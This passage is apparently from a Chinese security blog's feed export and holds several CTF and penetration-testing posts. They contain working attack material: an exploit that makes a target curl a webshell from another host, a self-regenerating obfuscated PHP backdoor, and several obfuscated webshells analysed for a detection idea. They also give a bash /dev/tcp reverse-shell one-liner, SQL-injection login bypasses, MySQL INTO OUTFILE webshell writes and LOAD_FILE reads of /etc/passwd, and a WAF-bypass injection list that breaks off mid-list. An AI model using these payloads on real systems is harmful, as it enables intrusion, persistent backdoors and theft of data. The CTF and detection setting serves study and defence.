exp_url</div><div class="line">                    result[&apos;VerifyInfo&apos;][&apos;is&apos;] = &apos;password yes&apos;</div><div class="line">                    data = &#123;</div><div class="line">                        pwd : u&apos;&apos;&apos;system(&apos;curl http://192.168.2.3:8080/ctf/webshell.php&apos;);&apos;&apos;&apos;</div><div class="line">                        #pwd : u&apos;&apos;&apos;system(&apos;curl http://10.0.1.2&apos;);&apos;&apos;&apos;</div><div class="line">                    &#125;</div><div class="line">                    try:</div><div class="line">                        response = req.post(exp_url, data=data, timeout=10, verify=False)</div><div class="line">                        result[&apos;VerifyInfo&apos;][&apos;flag&apos;] = response.content</div><div class="line">                        return self.parse_output(result)</div><div class="line">                    except Exception, e:</div><div class="line">                        return self.parse_output(result)</div><div class="line"></div><div class="line">        return self.parse_output(result)</div></pre></td></tr></table></figure></p>
<h1 id="六、批量上传文件"><a href="#六、批量上传文件" class="headerlink" title="六、批量上传文件"></a>六、批量上传文件</h1><p>做这个的目的其实就是因为第一次玩CTF线下赛手速慢，为了以后不在因为这个问题在跌倒而做的。PS:其实这个小功能有时候还是很有用的。我多读书多，不骗你-.-{斜眼}<br><img src="http://oa8y5guqs.bkt.clouddn.com/CTF3.png" alt=""></p>
<h1 id="七、权限维持"><a href="#七、权限维持" class="headerlink" title="七、权限维持"></a>七、权限维持</h1><p>CTF的权限维持很简单啊，就是木马别被删不就好了。并不需要提权啊什么的啊{捂脸}，有时候你考虑问题要结合实际啊，咋简单就咋来嘛。就是做个不死马就好了。<br>PS:这种小伎俩只是对付一般的CTF比赛，对那种赛棍肯定不适用了，人家写个条件竞争的，分分钟打哭你啊{捂脸}，所以还得看情况，该反弹还是要反弹啊。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    set_time_limit(0);</div><div class="line">    ignore_user_abort(1);</div><div class="line">    unlink(__FILE__);</div><div class="line">    //file_put_contents(__FILE__,&apos;&apos;);</div><div class="line">    while(1)&#123;</div><div class="line">        file_put_contents(&apos;C:\phpStudy\WWW\ctf\.config.php&apos;,&apos;&lt;?php $sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[\&apos;n985de9\&apos;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt;&apos;);</div><div class="line">        system(&apos;chmod 777 .config.php&apos;);</div><div class="line">        touch(&quot;.config.php&quot;,mktime(20,15,1,11,28,2016));</div><div class="line">        usleep(100);</div><div class="line">        &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>上传这个文件之后，批量访问，就会一直生成木马文件。<br><strong>PS：</strong>大家试想下，要是比赛中存在一个一句话后门，利用批量上传程序，将这个后门批量上上传到各个靶机上，再利用批量发包程序访问这个后门，再利用pocsuite,然后。。。哈哈哈，是不是很爽。(理想很丰满啊…)</p>
<h1 id="八、日志记录"><a href="#八、日志记录" class="headerlink" title="八、日志记录"></a>八、日志记录</h1><p>主要是为了网站访问记录，便于后续的问题排查，就是把各种字段的数据记录下来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">date_default_timezone_set(&apos;Asia/Shanghai&apos;);</div><div class="line">$ip        = $_SERVER[&quot;REMOTE_ADDR&quot;];   //访问IP</div><div class="line">$filename  = $_SERVER[&apos;PHP_SELF&apos;];  //访问的文件</div><div class="line">$parameter = $_SERVER[&quot;QUERY_STRING&quot;];  //查询的字符串</div><div class="line">$method    = $_SERVER[&apos;REQUEST_METHOD&apos;]; //请求方法</div><div class="line">...</div><div class="line">$time      =  date(&apos;Y-m-d H:i:s&apos;,time()); //请求时间</div><div class="line">$post      = file_get_contents(&quot;php://input&quot;,&apos;r&apos;); //接收POST数据</div><div class="line">$others    = &apos;**********************************************************************&apos;;</div><div class="line">$logadd    = &apos;访问时间：&apos;.$time.&apos;访问IP:&apos;.$ip.&apos;请求方法：&apos;.$method.&apos; &apos;.&apos;访问链接：&apos;.$filename.&apos;?&apos;.$parameter.&quot;\r\n&quot;;...</div><div class="line">//记录写入</div><div class="line">$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);</div><div class="line">fwrite($fh, $logadd);</div><div class="line">fwrite($fh,print_r($_COOKIE, true).&quot;\r\n&quot;);</div><div class="line">fwrite($fh,$others.&quot;\r\n&quot;);</div><div class="line">fclose($fh);</div></pre></td></tr></table></figure></p>
<h1 id="九、文件监控"><a href="#九、文件监控" class="headerlink" title="九、文件监控"></a>九、文件监控</h1><p>网上自己搜搜吧，很多</p>
<h1 id="十、WAF"><a href="#十、WAF" class="headerlink" title="十、WAF"></a>十、WAF</h1><p>网上自己搜搜吧，很多</p>
<p>PS：九和十，注意分寸，不能影响正常业务的。</p>
<p>。。。</p>
<p>好久没写这么长的博客了。。。</p>
]]></content>
      
        
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> CTF </tag>
            
            <tag> Python </tag>
            
            <tag> PHP </tag>
            
            <tag> 自动化 </tag>
            
            <tag> tcpdump </tag>
            
            <tag> webshell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[漏洞挖掘之子域名采集]]></title>
      <url>/2017/04/29/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E5%AD%90%E5%9F%9F%E5%90%8D%E9%87%87%E9%9B%86/</url>
      <content type="html"><![CDATA[<p>准备准备东西，以后就开始正式挖洞了(之前都是野生的啊[捂脸])，整理下相关的知识，方便自己查看吧。(求大佬们的姿势 *&gt;*)<br><a id="more"></a></p>
<h1 id="1、Web子域名猜测与访问尝试"><a href="#1、Web子域名猜测与访问尝试" class="headerlink" title="1、Web子域名猜测与访问尝试"></a>1、Web子域名猜测与访问尝试</h1><p>猜测一些可能的子域名，然后浏览器访问下看是否存在。</p>
<h1 id="2、搜索引擎查询"><a href="#2、搜索引擎查询" class="headerlink" title="2、搜索引擎查询"></a>2、搜索引擎查询</h1><p>比如:  <code>site:163.com</code></p>
<h1 id="3、查询DNS的一些解析记录"><a href="#3、查询DNS的一些解析记录" class="headerlink" title="3、查询DNS的一些解析记录"></a>3、查询DNS的一些解析记录</h1><p>比如查询 <code>MX</code>、<code>CNAME</code> 记录等</p>
<p>比如用 <code>nslookup</code>命令</p>
<blockquote>
<p>nslookup -qt=any bing.com</p>
</blockquote>
<h1 id="4、爬虫爬取页面提取子域名"><a href="#4、爬虫爬取页面提取子域名" class="headerlink" title="4、爬虫爬取页面提取子域名"></a>4、爬虫爬取页面提取子域名</h1><p>可以利用爬虫从页面源代码中提取子域名</p>
<p>比如burp 的spider爬虫</p>
<h1 id="5、crossdomain-xml-文件"><a href="#5、crossdomain-xml-文件" class="headerlink" title="5、crossdomain.xml 文件"></a>5、crossdomain.xml 文件</h1><h1 id="6、通过-IP-反查"><a href="#6、通过-IP-反查" class="headerlink" title="6、通过 IP 反查"></a>6、通过 IP 反查</h1><p>whois，站长工具等</p>
<h1 id="7、通过-HTTPS-证书搜集"><a href="#7、通过-HTTPS-证书搜集" class="headerlink" title="7、通过 HTTPS 证书搜集"></a>7、通过 HTTPS 证书搜集</h1><p>https的站点都有证书</p>
<p>打开证书，查看详细信息<code>-&gt;</code>使用者可选名称<code>-&gt;</code>DNS Name</p>
<h1 id="8、一些漏洞的利用"><a href="#8、一些漏洞的利用" class="headerlink" title="8、一些漏洞的利用"></a>8、一些漏洞的利用</h1><p>如： DNS 域传送漏洞</p>
<pre><code>nslookup
set type=ns
xxx.com
server servers address
set type=any
ls -d xxx.com
</code></pre><h1 id="在线工具："><a href="#在线工具：" class="headerlink" title="在线工具："></a>在线工具：</h1><ol>
<li><code>http://i.links.cn/subdomain/</code> 可查询二级、三级等子域名</li>
<li><code>http://dns.aizhan.com/</code> 查询同 IP 绑定了哪些域名</li>
<li><code>https://crt.sh/</code> 根据 HTTPS 证书查询子域名<br> <a href="https://crt.sh/?q=%25.baidu.com" target="_blank" rel="external">https://crt.sh/?q=%25.baidu.com</a></li>
<li><code>https://censys.io/certificates?q=.example.com</code> Censys.io查询</li>
</ol>
<h1 id="本地工具"><a href="#本地工具" class="headerlink" title="本地工具"></a>本地工具</h1><ol>
<li>Layer 子域名挖掘机</li>
<li><p>wydomain</p>
<p> 猪猪侠：<a href="https://github.com/ring04h/wydomain" target="_blank" rel="external">https://github.com/ring04h/wydomain</a></p>
</li>
<li><p>subDomainsBrute</p>
</li>
<li>Sublist3r 集合google，bing，crt.sh等强大的根据<br> python sublist3r.py -d example.com</li>
<li>theHarvester<br> python theHarvester.py -d example.com -b all<br> 这个工具有个比较好的它能够搜集目标的邮箱。</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Webshell查杀的新思路]]></title>
      <url>/2017/04/27/Webshell%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF/</url>
      <content type="html"><![CDATA[<p>由于学校要举办个CTF比赛，所以没办法必须参加。。。然后就是准备各种脚本了，关于webshell的查杀有了一个新的想法。<br><a id="more"></a><br>最简单的一句话形如：<code>&lt;?php @eval($_POST[&#39;pass&#39;])?&gt;</code>，原理很简单<br>首先<code>$_POST</code>会获取POST到服务器的参数名为<code>pass</code>的POST请求数据，然后函数<code>eval</code>会将<code>$_POST</code>获取的字符串按照PHP语法进行解析，这样我们通过各种PHP函数的组合使用就能通过中国菜刀等工具对服务器的文件等进行操作，这也就是常见一句话的工作原理。</p>
<p>这里我用两个i春秋上的过狗马来分析下：<br>第一个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$mt=&quot;mFsKCleRfU&quot;;</div><div class="line">$ojj=&quot;IEBleldle&quot;;</div><div class="line">$hsa=&quot;E9TVFsnd2VuJ10p&quot;;</div><div class="line">$fnx=&quot;Ow==&quot;;</div><div class="line">$zk = str_replace(&quot;d&quot;,&quot;&quot;,&quot;sdtdrd_redpdldadcde&quot;);</div><div class="line">//字符串替换：替换sdtdrd_redpdldadcde里的d为空  得到函数str_replace</div><div class="line">$ef = $zk(&quot;z&quot;, &quot;&quot;, &quot;zbazsze64_zdzeczodze&quot;);</div><div class="line">//调用$zk 字符串替换：替换zbazsze64_zdzeczodze里的z为空  得到base64_decode</div><div class="line">$dva = $zk(&quot;p&quot;,&quot;&quot;,&quot;pcprpepaptpe_fpupnpcptpipopn&quot;);</div><div class="line">//调用$zk 字符串替换：替换pcprpepaptpe_fpupnpcptpipopn里的z为空   得到create_function创建匿名函数</div><div class="line">$zvm = $dva(&apos;&apos;, $ef($zk(&quot;le&quot;, &quot;&quot;, $ojj.$mt.$hsa.$fnx)));</div><div class="line">//分解步骤</div><div class="line">//$zvm=create_function(base64_decode(str_replace(&quot;le&quot;,&quot;&quot;,&quot;IEBleldlemFsKCleRfUE9TVFsnd2VuJ10pOw==&quot;)))  //拼接后的语句</div><div class="line">//$zvm=create_function(base64_decode(IEBldmFsKCRfUE9TVFsnd2VuJ10pOw==)))   //执行完str_replace函数后，返回base64加密后的字符串</div><div class="line">//$zvm=create_function(@eval($_POST[&apos;wen&apos;]));   //执行完base64_decode 得到解密后的字符串 得到一句话木马 密码是wen</div><div class="line">$zvm();  //执行</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>第二个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$uf=&quot;snd2Fqd&quot;;</div><div class="line">$ka=&quot;IEBldmFsK&quot;;</div><div class="line">$pjt=&quot;CRfUE9TVF&quot;;</div><div class="line">$vbl = str_replace(&quot;ti&quot;,&quot;&quot;,&quot;tistittirti_rtietipltiatice&quot;);  //空格替换ti str_replace</div><div class="line">$iqw=&quot;WVqaSddKTs=&quot;;</div><div class="line">$bkf = $vbl(&quot;k&quot;, &quot;&quot;, &quot;kbakske6k4k_kdkekckokdke&quot;);     //空格替换k base64_decode  （base64加密）</div><div class="line">$sbp = $vbl(&quot;ctw&quot;,&quot;&quot;,&quot;ctwcctwrectwatctwectw_fctwuncctwtctwioctwn&quot;);   //空格替换ctw create_function</div><div class="line">$mpy = $sbp(&apos;&apos;, $bkf($vbl(&quot;b&quot;, &quot;&quot;, $ka.$pjt.$uf.$iqw)));</div><div class="line">//$mpy =create_function(&apos;&apos;, base64_decode(str_replace(&quot;b&quot;, &quot;&quot;,&apos;IEBldmFsKCRfUE9TVFsnd2FqdWVqaSddKTs=&apos;)))</div><div class="line">//$mpy= @eval($_POST[&apos;wajueji&apos;]);</div><div class="line">$mpy();</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>现在的webshell大部分都是回调函数，匿名函数，及一些PHP的特殊的函数，或者是PHP的特性。构造出无特征的webshell，传统的基于正则的webshell查杀对于这些webshell是无法查出的，根据在D盾中的测试，就算报出，也是级别为1，2的低级的，基本上咱们就忽略了。</p>
<p>咱们都知道传统的webshell查杀基本上都是基于正则库(这里不得不吐槽下公司的那个webshell查杀工具，真几把垃圾的不行)，为什么我们自己就能断定某个PHP脚本是是webshell呢？因为我们在自己的大脑中虚拟调试了这个PHP脚本，知道它是干嘛的了，所以这就是和工具的区别，所以我打算开发的webshell查杀就是<strong>基于虚拟执行和正则</strong>的webshell查杀。</p>
<p>比如我们那上面的第一个列子：<br>如果我们<code>echo $zk,$ef,$dva,$zvm</code>则结果为：<code>str_replace,base64_decode,create_function,create_function(@eval($_POST[&#39;wen&#39;]))</code>这样在基于正则匹配之后是不是就很明显了。</p>
<p>再来看几个例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&apos;n985de9&apos;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt;</div></pre></td></tr></table></figure>
<p>按照这个思路是不是很容易检测了。<br>再来看一个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;); // $_=&apos;assert&apos;;</div><div class="line">$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;</div><div class="line">$___=$$__;</div><div class="line">$_($___[_]); // assert($_POST[_]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>所以现在要做的就是找出脚本中所有的变量及匿名函数即可。</p>
]]></content>
      
        
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> CTF </tag>
            
            <tag> WAF绕过 </tag>
            
            <tag> webshell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[关于'万能密码'的思考]]></title>
      <url>/2017/04/25/%E5%85%B3%E4%BA%8E%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%9A%84%E6%80%9D%E8%80%83/</url>
      <content type="html"><![CDATA[<p>最近在总结的时候，关于SQL万能密码方面的一些思考。<br><a id="more"></a><br>SQL万能密码，想必大家都知道，比如像类似的<code>admin&#39; or &#39;1&#39;=&#39;1&#39;--</code>这样的代码，就是让SQL的表达式返回true。</p>
<p>从而达到逻辑正确。</p>
<p>我们常用的注释符有：<br><code>%00,%80-%99</code><br><code>--</code><br><code>-- +</code><br><code>#</code>等<br>如果过滤了<code>or</code>,<code>--</code>,<code>#</code>等特殊字符的话，我们的常用的万能密码就不能使用了，根据之前做<code>命令执行</code>绕过的经验，使用payload：<strong><code>&#39;||&#39;</code></strong></p>
<p>和万能密钥一样，先闭合前面的语句，后面的<code>&#39;</code>与原语句闭合得到一串字符串，我们知道字符串肯定是<code>非0</code>的，然后再<code>||</code>或运算符运算后，得到的永远是true。</p>
]]></content>
      
        
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> WAF绕过 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 万能密码 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[渗透测试之反弹shell命令分析]]></title>
      <url>/2017/04/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p>我们在对linux主机进行渗透测试的时候，经常回用到反弹shell,之前也没好好去研究、理解具体都是干什么的，就只知道会用…(so low…-.-)<br><a id="more"></a><br>最基本的反弹shell的代码如下：</p>
<blockquote>
<p>bash -i &gt;&amp; /dev/tcp/192.168.1.1/8080 0&gt;&amp;1</p>
</blockquote>
<p>咱们一步一步来分析：</p>
<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p><strong><code>bash -i</code></strong></p>
<p>这个大家都知道就是打开一个交互式的bash</p>
<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p><strong><code>/dev/tcp</code></strong></p>
<p>这个是linux中一个特殊的设备，打开这个文件就相当于建立了一个socket连接，对这个文件的读写就相当于在这个socket连接中传输数据。linux中还有和它一样的文件<code>/dev/udp</code>。</p>
<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p><strong><code>/192.168.1.1/8080</code></strong></p>
<p>这个是表示远程主机及监听的端口。</p>
<h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p><strong><code>0&gt;&amp;1</code></strong></p>
<p>首先科普下linux shell下常用的文件描述符：</p>
<ol>
<li>标准输入(stdin): 代码为’0’,使用 &lt; 或 &lt;&lt;</li>
<li>标准输出(stdout): 代码为’1’,使用 &gt; 或 &gt;&gt;</li>
<li>标准错误输出(stderr): 代码为’2’,使用 2&gt; 或 2&gt;&gt;</li>
</ol>
<p>经过查找发现：<br><code>&gt;&amp;</code>和<code>&amp;&gt;</code>的作用是一样的，即：</p>
<p><code>0&gt;&amp;1</code>和<code>0&lt;&amp;1</code>是一个意思，都是将标准输入重定向到标准输出中。</p>
<h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>OVER!<br>好奇心真的很有用啊! )_(</p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL写shell的一些tips]]></title>
      <url>/2017/04/01/MySQL%E5%BE%97%E5%88%B0%E8%B7%AF%E5%BE%84%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>通过注入写shell，首先需要找到网站的绝对路径。<br><a id="more"></a></p>
<h1 id="一、找路径"><a href="#一、找路径" class="headerlink" title="一、找路径"></a>一、找路径</h1><h2 id="1-报错"><a href="#1-报错" class="headerlink" title="1.报错"></a>1.报错</h2><p><strong>tips：</strong><br>有时候<code>information_schema.tables</code>不能用时，在MySQL 5.6及以上版本中可以使用以下表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">?id=1&apos; union select 1,group_concat(table_name) from mysql.innodb_table_stats where database_name=schema()%23&amp;Submit=Submit%23</div><div class="line">?id=1&apos; union select 1,group_concat(table_name) from mysql.innodb_index_stats where database_name=schema()%23&amp;Submit=Submit%23</div></pre></td></tr></table></figure></p>
<h2 id="2-phpinfo"><a href="#2-phpinfo" class="headerlink" title="2.phpinfo"></a>2.phpinfo</h2><h2 id="3-load-file"><a href="#3-load-file" class="headerlink" title="3.load_file"></a>3.load_file</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT LOAD_FILE(&apos;/etc/apache2/sites-available/default&apos;);</div></pre></td></tr></table></figure>
<p><strong>tips：</strong><br>有时候过滤了敏感路径可以试试这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT LOAD_FILE(&apos;/etc/sb/../passwd&apos;);</div></pre></td></tr></table></figure></p>
<h2 id="4-数组"><a href="#4-数组" class="headerlink" title="4.数组"></a>4.数组</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user[]=1&amp;passwd[]=1</div></pre></td></tr></table></figure>
<h2 id="5-通过mysql函数-查找mysql安装目录"><a href="#5-通过mysql函数-查找mysql安装目录" class="headerlink" title="5.通过mysql函数 查找mysql安装目录"></a>5.通过mysql函数 查找mysql安装目录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">show variables like &apos;datadir&apos;;</div></pre></td></tr></table></figure>
<h1 id="二、写shell"><a href="#二、写shell" class="headerlink" title="二、写shell"></a>二、写shell</h1><h2 id="1-获取mysql-user和文件权限"><a href="#1-获取mysql-user和文件权限" class="headerlink" title="1.获取mysql.user和文件权限"></a>1.获取<code>mysql.user</code>和文件权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select group_concat(user,0x3a,file_priv) from mysql.user;</div><div class="line">出现Y，这就代表你有文件权限，N就是没有</div></pre></td></tr></table></figure>
<h2 id="2-写shell"><a href="#2-写shell" class="headerlink" title="2.写shell"></a>2.写shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select&apos;&lt;?php @eval($_POST[-77]);?&gt;&apos;INTO OUTFILE &apos;E:\Web\errors.php&apos;</div><div class="line">如果不成功，可能转义了。</div><div class="line">select&apos;&lt;?php @eval($_POST[-77]);?&gt;&apos;INTO OUTFILE &apos;E:\\Web\\errors.php&apos;</div></pre></td></tr></table></figure>
<p>最好还是把内容编码下。</p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> webshell </tag>
            
            <tag> MySQL </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL注入-绕过]]></title>
      <url>/2017/03/21/SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/</url>
      <content type="html"><![CDATA[<p>整理下关于SQL注入绕过的一些姿势。欢迎大牛补充 !^—^!<br><a id="more"></a></p>
<h1 id="0x01-绕过waf思路"><a href="#0x01-绕过waf思路" class="headerlink" title="0x01 绕过waf思路"></a>0x01 绕过waf思路</h1><p>从第一步起，一点一点去分析，然后绕过。</p>
<ol>
<li><p>过滤 and,or</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or)/i&apos;, $id)</div><div class="line">Filtered injection: 1 or 1 = 1      1 and 1 = 1</div><div class="line">Bypassed injection: 1 || 1 = 1      1 &amp;&amp; 1 = 1</div></pre></td></tr></table></figure>
</li>
<li><p>过滤 and, or, union</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union)/i&apos;, $id)</div><div class="line">Filtered injection: union select user, password from users</div><div class="line">Bypassed injection: 1 || (select user from users where user_id = 1) = &apos;admin&apos;</div></pre></td></tr></table></figure>
</li>
<li><p>过滤 and, or, union, where</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union|where)/i&apos;, $id)</div><div class="line">Filtered injection: 1 || (select user from users where user_id = 1) = &apos;admin&apos;</div><div class="line">Bypassed injection: 1 || (select user from users limit 1) = &apos;admin&apos;</div></pre></td></tr></table></figure>
</li>
<li><p>过滤 and, or, union, where, limit</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union|where|limit)/i&apos;, $id)</div><div class="line">Filtered injection: 1 || (select user from users limit 1) = &apos;admin&apos;</div><div class="line">Bypassed injection: 1 || (select user from users group by user_id having user_id = 1) = &apos;admin&apos;</div></pre></td></tr></table></figure>
</li>
<li><p>过滤 and, or, union, where, limit, group by</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union|where|limit|group by)/i&apos;, $id)</div><div class="line">Filtered injection: 1 || (select user from users group by user_id having user_id = 1) = &apos;admin&apos;</div><div class="line">Bypassed injection: 1 || (select substr(gruop_concat(user_id),1,1) user from users ) = 1</div></pre></td></tr></table></figure>
</li>
<li><p>过滤 and, or, union, where, limit, group by, select</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union|where|limit|group by|select)/i&apos;, $id)</div><div class="line">Filtered injection: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</div><div class="line">Bypassed injection: 1 || 1 = 1 into outfile &apos;result.txt&apos;</div><div class="line">Bypassed injection: 1 || substr(user,1,1) = &apos;a&apos;</div></pre></td></tr></table></figure>
</li>
<li><p>过滤 and, or, union, where, limit, group by, select, ‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;)/i&apos;, $id)</div><div class="line">Filtered injection: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</div><div class="line">Bypassed injection: 1 || user_id is not null</div><div class="line">Bypassed injection: 1 || substr(user,1,1) = 0x61</div><div class="line">Bypassed injection: 1 || substr(user,1,1) = unhex(61)</div></pre></td></tr></table></figure>
</li>
<li><p>过滤 and, or, union, where, limit, group by, select, ‘, hex</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex)/i&apos;, $id)</div><div class="line">Filtered injection: 1 || substr(user,1,1) = unhex(61)</div><div class="line">Bypassed injection: 1 || substr(user,1,1) = lower(conv(11,10,36))</div></pre></td></tr></table></figure>
</li>
<li><p>过滤 and, or, union, where, limit, group by, select, ‘, hex, substr</p>
